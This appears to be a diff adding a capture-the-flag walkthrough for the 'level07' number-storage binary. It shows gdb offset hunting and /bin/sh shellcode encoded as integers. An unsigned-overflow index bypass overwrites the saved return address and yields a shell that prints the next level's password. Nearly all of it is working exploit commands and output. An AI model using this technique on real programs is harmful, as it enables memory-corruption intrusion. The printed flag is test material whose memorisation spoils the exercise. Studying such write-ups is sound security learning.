@@ -282,4 +282,110 @@ End of assembler dump.
 memset(argv, 0)
 memset(env, 0)
 
-# 0xffffd5d8 <== index 1 buffer
+$> gdb level07
+gdb> disass main
+[...]
+0x0804892b <+520>:	call   0x80486d7 <read_number>
+[...]
+gdb> b *0x0804892b
+gdb> r
+[...]
+Input command: read
+[...]
+Guessed arguments:
+arg[0]: 0xffffd5d4 --> 0x0
+gdb> info frame
+[...]
+ Saved registers:
+  ebx at 0xffffd78c, ebp at 0xffffd798, esi at 0xffffd790, edi at 0xffffd794, eip at 0xffffd79c
+[...]
+gdb> p/d (0xffffd79c - 0xffffd5d4) / 4
+$1 = 114
+# 114 % 3 == 0 so it's a protected index
+
+# Because gdb alter the address of the array we want to jump in
+# we need to find another way to find it's address
+
+gdb> b read_number
+gdb> r
+[...]
+Input command: read
+gdb> x $ebp+8
+0xffffd5b0:	0xffffd5d4
+gdB> p/d (0xffffd5d4 - 0xffffd5b0) / 4
+$1 = 9
+# We need to read the index -9 to find the address of the array
+
+# We will use the following shellcode
+# \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+
+$> python3
+# Shellcode to integers
+>>> 0xe1f7c931
+3791112497
+>>> 0x2f2f6851
+791636049
+>>> 0x2f686873
+795371635
+>>> 0x896e6962
+2305714530
+>>> 0xcd0bb0e3
+3440095459
+>>> 0x80
+128
+
+# Overflow for protected index
+>>> (2**32) / 4
+1073741824.0
+>>> (2**32 + (4 * 3)) / 4
+1073741827.0
+>>> (2**32 + (4 * 114)) / 4
+1073741938.0
+
+$> ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 3791112497
+ Index: 1073741824
+ Completed store command successfully
+Input command: store
+ Number: 791636049
+ Index: 1
+ Completed store command successfully
+Input command: store
+ Number: 795371635
+ Index: 2
+ Completed store command successfully
+Input command: store
+ Number: 2305714530
+ Index: 1073741827
+ Completed store command successfully
+Input command: store
+ Number: 3440095459
+ Index: 4
+ Completed store command successfully
+Input command: store
+ Number: 128
+ Index: 5
+ Completed store command successfully
+Input command: read
+ Index: -9
+ Number at data[4294967287] is 4294956532
+ Completed read command successfully
+Input command: store
+ Number: 4294956532
+ Index: 1073741938
+ Completed store command successfully
+Input command: quit
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
